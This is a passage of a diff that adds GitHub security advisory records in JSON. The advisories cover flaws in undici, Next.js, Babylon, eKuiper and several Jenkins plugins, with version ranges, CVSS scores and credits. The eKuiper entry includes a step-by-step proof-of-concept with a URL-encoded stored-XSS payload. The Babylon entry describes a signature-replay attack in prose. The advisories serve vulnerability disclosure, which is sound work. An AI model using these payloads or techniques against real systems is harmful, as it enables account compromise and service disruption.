+    "description": "### Impact\n\nApplications that use undici to implement a webhook-like system are vulnerable. If the attacker set up a server with an invalid certificate, and they can force the application to call the webhook repeatedly, then they can cause a memory leak. \n\n### Patches\n\nThis has been patched in https://github.com/nodejs/undici/pull/4088.\n\n### Workarounds\n\nIf a webhook fails, avoid keep calling it repeatedly.\n\n### References\n\nReported as: https://github.com/nodejs/undici/issues/3895",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": "https://api.github.com/repos/nodejs/undici/security-advisories/GHSA-cxrh-j4jr-qwg3",
+    "source_code_location": "https://github.com/nodejs/undici",
+    "identifiers": [
+      {
+        "value": "GHSA-cxrh-j4jr-qwg3",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47279",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/nodejs/undici/security/advisories/GHSA-cxrh-j4jr-qwg3",
+      "https://github.com/nodejs/undici/issues/3895",
+      "https://github.com/nodejs/undici/pull/4088",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47279",
+      "https://github.com/advisories/GHSA-cxrh-j4jr-qwg3"
+    ],
+    "published_at": "2025-05-15T14:15:06Z",
+    "updated_at": "2025-05-16T02:07:01Z",
+    "github_reviewed_at": "2025-05-15T14:15:06Z",
+    "nvd_published_at": "2025-05-15T18:15:38Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "undici"
+        },
+        "vulnerable_version_range": "< 5.29.0",
+        "first_patched_version": "5.29.0",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "undici"
+        },
+        "vulnerable_version_range": ">= 6.0.0, < 6.21.2",
+        "first_patched_version": "6.21.2",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "undici"
+        },
+        "vulnerable_version_range": ">= 7.0.0, < 7.5.0",
+        "first_patched_version": "7.5.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
+        "score": 3.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-401",
+        "name": "Missing Release of Memory after Effective Lifetime"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "styfle",
+          "id": 229881,
+          "node_id": "MDQ6VXNlcjIyOTg4MQ==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/229881?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/styfle",
+          "html_url": "https://github.com/styfle",
+          "followers_url": "https://api.github.com/users/styfle/followers",
+          "following_url": "https://api.github.com/users/styfle/following{/other_user}",
+          "gists_url": "https://api.github.com/users/styfle/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/styfle/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/styfle/subscriptions",
+          "organizations_url": "https://api.github.com/users/styfle/orgs",
+          "repos_url": "https://api.github.com/users/styfle/repos",
+          "events_url": "https://api.github.com/users/styfle/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/styfle/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      },
+      {
+        "user": {
+          "login": "mcollina",
+          "id": 52195,
+          "node_id": "MDQ6VXNlcjUyMTk1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/52195?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/mcollina",
+          "html_url": "https://github.com/mcollina",
+          "followers_url": "https://api.github.com/users/mcollina/followers",
+          "following_url": "https://api.github.com/users/mcollina/following{/other_user}",
+          "gists_url": "https://api.github.com/users/mcollina/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/mcollina/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/mcollina/subscriptions",
+          "organizations_url": "https://api.github.com/users/mcollina/orgs",
+          "repos_url": "https://api.github.com/users/mcollina/repos",
+          "events_url": "https://api.github.com/users/mcollina/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/mcollina/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "coordinator"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
+      "score": 3.1
+    }
+  },
+  {
+    "ghsa_id": "GHSA-qpjv-v59x-3qc4",
+    "cve_id": "CVE-2025-32421",
+    "url": "https://api.github.com/advisories/GHSA-qpjv-v59x-3qc4",
+    "html_url": "https://github.com/advisories/GHSA-qpjv-v59x-3qc4",
+    "summary": "Next.js Race Condition to Cache Poisoning",
+    "description": "**Summary**  \nWe received a responsible disclosure from Allam Rachid (zhero) for a low-severity race-condition vulnerability in Next.js. This issue only affects the **Pages Router** under certain misconfigurations, causing normal endpoints to serve `pageProps` data instead of standard HTML.\n\n[Learn more here](https://vercel.com/changelog/cve-2025-32421)\n\n**Credit**  \nThank you to **Allam Rachid (zhero)** for the responsible disclosure. This research was rewarded as part of our bug bounty program.",
+    "type": "reviewed",
+    "severity": "low",
+    "repository_advisory_url": "https://api.github.com/repos/vercel/next.js/security-advisories/GHSA-qpjv-v59x-3qc4",
+    "source_code_location": "https://github.com/vercel/next.js",
+    "identifiers": [
+      {
+        "value": "GHSA-qpjv-v59x-3qc4",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-32421",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/vercel/next.js/security/advisories/GHSA-qpjv-v59x-3qc4",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-32421",
+      "https://vercel.com/changelog/cve-2025-32421",
+      "https://github.com/advisories/GHSA-qpjv-v59x-3qc4"
+    ],
+    "published_at": "2025-05-15T14:12:26Z",
+    "updated_at": "2025-05-15T14:12:28Z",
+    "github_reviewed_at": "2025-05-15T14:12:26Z",
+    "nvd_published_at": "2025-05-14T23:15:47Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "next"
+        },
+        "vulnerable_version_range": "< 14.2.24",
+        "first_patched_version": "14.2.24",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "next"
+        },
+        "vulnerable_version_range": ">= 15.0.0, < 15.1.6",
+        "first_patched_version": "15.1.6",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "score": 3.7
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-362",
+        "name": "Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "cold-try",
+          "id": 54223593,
+          "node_id": "MDQ6VXNlcjU0MjIzNTkz",
+          "avatar_url": "https://avatars.githubusercontent.com/u/54223593?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/cold-try",
+          "html_url": "https://github.com/cold-try",
+          "followers_url": "https://api.github.com/users/cold-try/followers",
+          "following_url": "https://api.github.com/users/cold-try/following{/other_user}",
+          "gists_url": "https://api.github.com/users/cold-try/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/cold-try/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/cold-try/subscriptions",
+          "organizations_url": "https://api.github.com/users/cold-try/orgs",
+          "repos_url": "https://api.github.com/users/cold-try/repos",
+          "events_url": "https://api.github.com/users/cold-try/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/cold-try/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "score": 3.7
+    },
+    "epss": {
+      "percentage": 0.00025,
+      "percentile": 0.05305
+    }
+  },
+  {
+    "ghsa_id": "GHSA-869w-47c6-fq8q",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-869w-47c6-fq8q",
+    "html_url": "https://github.com/advisories/GHSA-869w-47c6-fq8q",
+    "summary": "Babylon Integer Overflow in Distribution Module CumulativeRewardRatio Calculation Leading to Chain Halt",
+    "description": "### Summary\nMinting large amount of tokens through ibc transfer and then depositing them in validator rewards pool (via `DepositValidatorRewardsPool` message) can lead to integer overflow panic when calculating `cumulative_reward_ratio` for the validator.\n\nThis calculation happens in `x/epoching` module `EndBlocker`, thus the panic will halt the chain.\n\n### Impact\n\nDenial of Service - Due to panic in the `EndBlocker` Babylon Genesis will halt",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/babylonlabs-io/babylon/security-advisories/GHSA-869w-47c6-fq8q",
+    "source_code_location": "https://github.com/babylonlabs-io/babylon",
+    "identifiers": [
+      {
+        "value": "GHSA-869w-47c6-fq8q",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-869w-47c6-fq8q",
+      "https://github.com/advisories/GHSA-869w-47c6-fq8q"
+    ],
+    "published_at": "2025-05-15T14:05:50Z",
+    "updated_at": "2025-05-15T14:05:52Z",
+    "github_reviewed_at": "2025-05-15T14:05:50Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/babylonlabs-io/babylon"
+        },
+        "vulnerable_version_range": "<= 1.0.2",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+        "score": 8.2
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-190",
+        "name": "Integer Overflow or Wraparound"
+      },
+      {
+        "cwe_id": "CWE-770",
+        "name": "Allocation of Resources Without Limits or Throttling"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-7mm3-vfg8-7rg6",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-7mm3-vfg8-7rg6",
+    "html_url": "https://github.com/advisories/GHSA-7mm3-vfg8-7rg6",
+    "summary": "Babylon Finality Provider `MsgCommitPubRandList` replay attack",
+    "description": "### Summary\n\nA high vulnerability exists in the Babylon protocol's x/finality module due to a lack of domain separation in signed messages, combined with insufficient validation in the MsgCommitPubRandList handler. Specifically, the handler does not enforce that the submitted Commitment field is 32 bytes long. This allows an attacker to replay a signature originally generated for a different message (e.g., a Proof-of-Possession in MsgCreateFinalityProvider) as a MsgCommitPubRandList. By crafting the message parameters, an attacker can use the typically 20-byte address bytes (from the PoP context) to form the StartHeight, NumPubRand, and a shorter-than-expected Commitment (e.g., 4 bytes). The replayed signature will pass verification for this crafted message, leading to the injection of an invalid PubRand commitment.\n\n### Impact\n\nSuccessful exploitation of this vulnerability, specifically via the PoP signature replay, allows an attacker to store an invalid PubRand commitment (with a non-standard length, e.g., 4 bytes) for a targeted Finality Provider (FP). Despite the commitment itself being malformed, it's the associated StartHeight and NumPubRand (derived from the replayed address bytes and typically very large) that cause severe consequences\n\n### Future recommendations\n\nTo minimize future risk of such attacks, all finality providers should:\n1.  Never re-use your finality provider EOTS across the networks (e.g., the testnet) or for any other purpose. \n2. Never use EOTS keys to sign any other data than relevant to in-protocol messages. Ideally EOTS key should only be used to:\n    - Sign initial proof of possession message\n    - Sign periodic randomness commits\n    - Sign finality votes with every block",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/babylonlabs-io/babylon/security-advisories/GHSA-7mm3-vfg8-7rg6",
+    "source_code_location": "https://github.com/babylonlabs-io/babylon",
+    "identifiers": [
+      {
+        "value": "GHSA-7mm3-vfg8-7rg6",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/babylonlabs-io/babylon/security/advisories/GHSA-7mm3-vfg8-7rg6",
+      "https://github.com/advisories/GHSA-7mm3-vfg8-7rg6"
+    ],
+    "published_at": "2025-05-15T14:05:32Z",
+    "updated_at": "2025-05-15T14:05:33Z",
+    "github_reviewed_at": "2025-05-15T14:05:32Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/babylonlabs-io/babylon"
+        },
+        "vulnerable_version_range": "<= 1.0.2",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N",
+        "score": 8.9
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-290",
+        "name": "Authentication Bypass by Spoofing"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-9cwv-pxcr-hfjc",
+    "cve_id": "CVE-2024-52290",
+    "url": "https://api.github.com/advisories/GHSA-9cwv-pxcr-hfjc",
+    "html_url": "https://github.com/advisories/GHSA-9cwv-pxcr-hfjc",
+    "summary": "LF Edge eKuiper Vulnerable to Stored XSS in Configuration Key Functionality",
+    "description": "### Summary\nStored Cross-Site Scripting (XSS) vulnerability allows attackers to inject malicious scripts into web applications, which can then be executed in the context of other users' browsers. This can lead to unauthorized access to sensitive information, session hijacking, and spreading of malware, impacting user data privacy and application integrity.\n\n### Details\nA user with rights to modificate the service (e.g. kuiperUser role) can inject XSS Payload into Connection Configuration key `Name` (`confKey`) parameter. Then, after any user with access to this service (e.g. admin) will try to delete this key, a payload will act in victim's browser.\n\n### PoC\n1. Authorize as a user with rights to modificate the service (e.g. kuiperUser role).\n2. Create a service or go to the existing one and access the *Configuration > Connection* page:\n\n![*Configuration > Connection page](https://github.com/user-attachments/assets/d29cbc23-04a4-4a49-bbd9-b26f74282c5c)\n\n3. Open any existing Connection and press on `Add configuration key`:\n\n![image](https://github.com/user-attachments/assets/623dc76a-076c-41be-98d7-8fd42ed4e8fd)\n\n4. Set any name and Address, then intercept the request and add the following payload to the `confKey` parameter: `123%3Cimg%20src=1%20onerror%3dalert%281%29%3E`:\n\n![image](https://github.com/user-attachments/assets/405000db-ace9-4bca-ac52-7dc44c54a0ae)\n\n5. A new configuration key then will be set: \n\n![image](https://github.com/user-attachments/assets/43b75f1e-81ac-4815-9250-c1a0707827d3)\n\n6. *(Optional)* You can authorize another user with access to this service. For nexe steps I will use admin user\n7. After we push on delete button (trash icon) opposite the created connection, the payload will work:\n\n![image](https://github.com/user-attachments/assets/05a38899-343b-4f76-b6c7-8e27587e3cdf)\n\n\n### Impact\nStored Cross-site Scripting (XSS) vulnerability\n\nReported by Alexey Kosmachev, Lead Pentester from Bi.Zone",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/lf-edge/ekuiper/security-advisories/GHSA-9cwv-pxcr-hfjc",
+    "source_code_location": "https://github.com/lf-edge/ekuiper",
+    "identifiers": [
+      {
+        "value": "GHSA-9cwv-pxcr-hfjc",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-52290",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/lf-edge/ekuiper/security/advisories/GHSA-9cwv-pxcr-hfjc",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-52290",
+      "https://github.com/lf-edge/ekuiper/commit/943c02e10f0f8349e609474810eab5fa460d1a51",
+      "https://github.com/advisories/GHSA-9cwv-pxcr-hfjc"
+    ],
+    "published_at": "2025-05-14T21:41:26Z",
+    "updated_at": "2025-05-14T21:41:27Z",
+    "github_reviewed_at": "2025-05-14T21:41:26Z",
+    "nvd_published_at": "2025-05-14T08:15:33Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/lf-edge/ekuiper"
+        },
+        "vulnerable_version_range": "<= 1.14.7",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/lf-edge/ekuiper/v2"
+        },
+        "vulnerable_version_range": "< 2.1.0",
+        "first_patched_version": "2.1.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N",
+        "score": 6.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "TheMostKnown",
+          "id": 65551462,
+          "node_id": "MDQ6VXNlcjY1NTUxNDYy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/65551462?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/TheMostKnown",
+          "html_url": "https://github.com/TheMostKnown",
+          "followers_url": "https://api.github.com/users/TheMostKnown/followers",
+          "following_url": "https://api.github.com/users/TheMostKnown/following{/other_user}",
+          "gists_url": "https://api.github.com/users/TheMostKnown/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/TheMostKnown/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/TheMostKnown/subscriptions",
+          "organizations_url": "https://api.github.com/users/TheMostKnown/orgs",
+          "repos_url": "https://api.github.com/users/TheMostKnown/repos",
+          "events_url": "https://api.github.com/users/TheMostKnown/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/TheMostKnown/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N",
+      "score": 6.3
+    },
+    "epss": {
+      "percentage": 0.00032,
+      "percentile": 0.07811
+    }
+  },
+  {
+    "ghsa_id": "GHSA-xrpq-4g9w-qrwj",
+    "cve_id": "CVE-2025-47885",
+    "url": "https://api.github.com/advisories/GHSA-xrpq-4g9w-qrwj",
+    "html_url": "https://github.com/advisories/GHSA-xrpq-4g9w-qrwj",
+    "summary": "Jenkins Health Advisor by CloudBees Plugin Vulnerable to Cross-Site Scripting",
+    "description": "Jenkins Health Advisor by CloudBees Plugin 374.v194b_d4f0c8c8 and earlier does not escape responses from the Jenkins Health Advisor server, resulting in a stored cross-site scripting (XSS) vulnerability exploitable by attackers able to control Jenkins Health Advisor server responses.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/jenkinsci/cloudbees-jenkins-advisor-plugin",
+    "identifiers": [
+      {
+        "value": "GHSA-xrpq-4g9w-qrwj",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47885",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47885",
+      "https://www.jenkins.io/security/advisory/2025-05-14/#SECURITY-3559",
+      "https://github.com/jenkinsci/cloudbees-jenkins-advisor-plugin/commit/4b456b3110d1504d7dce8e7fca84c4e8793650e6",
+      "https://github.com/advisories/GHSA-xrpq-4g9w-qrwj"
+    ],
+    "published_at": "2025-05-14T21:31:20Z",
+    "updated_at": "2025-05-16T20:09:30Z",
+    "github_reviewed_at": "2025-05-16T14:46:30Z",
+    "nvd_published_at": "2025-05-14T21:15:59Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.jenkins-ci.plugins:cloudbees-jenkins-advisor"
+        },
+        "vulnerable_version_range": "< 374.376.v3a41aa142efe",
+        "first_patched_version": "374.376.v3a_41a_a_142efe",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "score": 8.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "score": 8.8
+    },
+    "epss": {
+      "percentage": 0.00018,
+      "percentile": 0.03184
+    }
+  },
+  {
+    "ghsa_id": "GHSA-p89h-p4ph-4vj6",
+    "cve_id": "CVE-2025-47889",
+    "url": "https://api.github.com/advisories/GHSA-p89h-p4ph-4vj6",
+    "html_url": "https://github.com/advisories/GHSA-p89h-p4ph-4vj6",
+    "summary": "Jenkins WSO2 Oauth Plugin Fails to Properly Authenticate User Credentials",
+    "description": "In Jenkins WSO2 Oauth Plugin 1.0 and earlier, authentication claims are accepted without validation by the \"WSO2 Oauth\" security realm, allowing unauthenticated attackers to log in to controllers using this security realm using any username and any password, including usernames that do not exist.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "",
+    "identifiers": [
+      {
+        "value": "GHSA-p89h-p4ph-4vj6",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47889",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47889",
+      "https://www.jenkins.io/security/advisory/2025-05-14/#SECURITY-3481",
+      "https://github.com/advisories/GHSA-p89h-p4ph-4vj6"
+    ],
+    "published_at": "2025-05-14T21:31:20Z",
+    "updated_at": "2025-05-16T14:49:30Z",
+    "github_reviewed_at": "2025-05-16T14:49:27Z",
+    "nvd_published_at": "2025-05-14T21:15:59Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.jenkins-ci.plugins:wso2id-oauth"
+        },
+        "vulnerable_version_range": "<= 1.0",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+        "score": 8.7
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-1390",
+        "name": "Weak Authentication"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8
+    },
+    "epss": {
+      "percentage": 0.00021,
+      "percentile": 0.0388
+    }
+  },
+  {
+    "ghsa_id": "GHSA-q7c3-x7hm-qq72",
+    "cve_id": "CVE-2025-47884",
+    "url": "https://api.github.com/advisories/GHSA-q7c3-x7hm-qq72",
+    "html_url": "https://github.com/advisories/GHSA-q7c3-x7hm-qq72",
+    "summary": "Jenkins OpenID Connect Provider Plugin Incorrectly Validates Crafted Build ID Tokens",
+    "description": "In Jenkins OpenID Connect Provider Plugin 96.vee8ed882ec4d and earlier the generation of build ID Tokens uses potentially overridden values of environment variables, in conjunction with certain other plugins allowing attackers able to configure jobs to craft a build ID Token that impersonates a trusted job, potentially gaining unauthorized access to external services.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/jenkinsci/oidc-provider-plugin",
+    "identifiers": [
+      {
+        "value": "GHSA-q7c3-x7hm-qq72",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47884",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47884",
+      "https://www.jenkins.io/security/advisory/2025-05-14/#SECURITY-3574",
+      "https://github.com/jenkinsci/oidc-provider-plugin/commit/29fd614b36171048ddc78a995ce44bd12bd7997d",
+      "https://github.com/jenkinsci/oidc-provider-plugin/releases/tag/111.v29fd614b_3617",
+      "https://github.com/advisories/GHSA-q7c3-x7hm-qq72"
+    ],
+    "published_at": "2025-05-14T21:31:20Z",
+    "updated_at": "2025-05-16T20:13:11Z",
+    "github_reviewed_at": "2025-05-16T14:42:45Z",
+    "nvd_published_at": "2025-05-14T21:15:59Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "io.jenkins.plugins:oidc-provider"
+        },
+        "vulnerable_version_range": "< 111.v29fd614b3617",
+        "first_patched_version": "111.v29fd614b_3617",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:L",
+        "score": 9.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-284",
+        "name": "Improper Access Control"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:L",
+      "score": 9.1
+    },
+    "epss": {
+      "percentage": 0.00022,
+      "percentile": 0.0438
+    }
+  },
+  {
+    "ghsa_id": "GHSA-5w52-96jj-fv59",
+    "cve_id": "CVE-2025-47886",
+    "url": "https://api.github.com/advisories/GHSA-5w52-96jj-fv59",
+    "html_url": "https://github.com/advisories/GHSA-5w52-96jj-fv59",
+    "summary": "Jenkins Cadence vManager Plugin Vulnerable to Cross-Site Request Forgery",
+    "description": "A cross-site request forgery (CSRF) vulnerability in Jenkins Cadence vManager Plugin 4.0.1-286.v9e25a_740b_a_48 and earlier allows attackers to connect to an attacker-specified URL using attacker-specified username and password.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/jenkinsci/vmanager-plugin",
+    "identifiers": [
+      {
+        "value": "GHSA-5w52-96jj-fv59",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47886",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47886",
+      "https://www.jenkins.io/security/advisory/2025-05-14/#SECURITY-3548",
+      "https://github.com/jenkinsci/vmanager-plugin/pull/25",
+      "https://github.com/jenkinsci/vmanager-plugin/releases/tag/4.0.1-288.v8804b_ea_a_cb_7f",
+      "https://github.com/advisories/GHSA-5w52-96jj-fv59"
+    ],
+    "published_at": "2025-05-14T21:31:20Z",
+    "updated_at": "2025-05-16T20:11:06Z",
+    "github_reviewed_at": "2025-05-16T14:44:52Z",
+    "nvd_published_at": "2025-05-14T21:15:59Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.jenkins-ci.plugins:vmanager-plugin"
+        },
+        "vulnerable_version_range": "< 4.0.1-286.v9e25a740ba48",
+        "first_patched_version": "4.0.1-288.v8804b_ea_a_cb_7f",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "score": 4.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-352",
+        "name": "Cross-Site Request Forgery (CSRF)"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+      "score": 4.3
+    },
+    "epss": {
+      "percentage": 0.00018,
+      "percentile": 0.03184
+    }
+  },
+  {
+    "ghsa_id": "GHSA-rf73-97j8-9vqh",
+    "cve_id": "CVE-2025-47887",
+    "url": "https://api.github.com/advisories/GHSA-rf73-97j8-9vqh",
+    "html_url": "https://github.com/advisories/GHSA-rf73-97j8-9vqh",
+    "summary": "Jenkins Cadence vManager Plugin is Missing Permission Checks",
+    "description": "Missing permission checks in Jenkins Cadence vManager Plugin 4.0.1-286.v9e25a_740b_a_48 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified username and password.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/jenkinsci/vmanager-plugin",
+    "identifiers": [
+      {
+        "value": "GHSA-rf73-97j8-9vqh",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47887",
+        "type": "CVE"
